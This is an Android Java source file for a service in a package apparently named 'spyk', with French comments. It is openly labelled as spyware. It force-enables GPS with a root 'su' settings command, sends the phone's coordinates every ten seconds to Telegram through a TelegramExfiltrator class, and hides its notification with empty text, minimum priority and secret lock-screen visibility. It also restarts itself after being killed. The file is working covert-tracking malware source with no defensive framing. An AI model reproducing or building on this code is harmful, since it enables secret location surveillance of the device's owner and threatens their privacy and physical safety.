package com.ware.spyk;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

public class LocalisationService extends Service {

    private static final String TAG = "LocalisationService";
    private static final String CHANNEL_ID = "SpyChannel";
    private LocationManager locationManager;
    private LocationListener locationListener;

    @Override
    public void onCreate() {
        super.onCreate();

        try {
            Log.d(TAG, "Activation du GPS");
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "settings put secure location_providers_allowed +gps"});
            process.waitFor();
        } catch (Exception e) {
            Log.e(TAG, "Erreur lors de l'activation du GPS", e);
            e.printStackTrace();
        }

        createNotificationChannel(); // Obligatoire pour Foreground Service
        startForegroundServiceWithNotification(); // Démarre le service en foreground

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double latitude = location.getLatitude();
                double longitude = location.getLongitude();
                String message = "Position capturée : " + latitude + ", " + longitude;
                Log.d(TAG, message);
                TelegramExfiltrator.sendTexte(message);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                // Handle status changes
                Log.d("MyLocationListener", "Status changed for provider $provider: $status");
                // Make sure this method has the correct signature and is implemented
            }
            @Override
            public void onProviderEnabled(String provider) {}
            @Override
            public void onProviderDisabled(String provider) {}
        };

        startLocationUpdates();
    }

    private void startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permission GPS manquante !");
            return;
        }

        locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                10000,  // 10 sec
                10,     // 10 mètres
                locationListener
        );
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // START_STICKY : le service reste actif même après avoir été tué par le système
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // 🟢 Création du canal de notification obligatoire pour API 26+
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d(TAG, "Création du canal de notification");
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Spy Background Service",
                    NotificationManager.IMPORTANCE_MIN // Notification minimale, quasiment invisible
            );
            channel.setDescription("Spyware Background Location Tracking");
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    // 🟢 Démarre le service en mode foreground avec une notification discrète
    private void startForegroundServiceWithNotification() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")  // Pas de titre pour discrétion
                .setContentText("")   // Pas de texte non plus
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        startForeground(1, notification);
    }
}
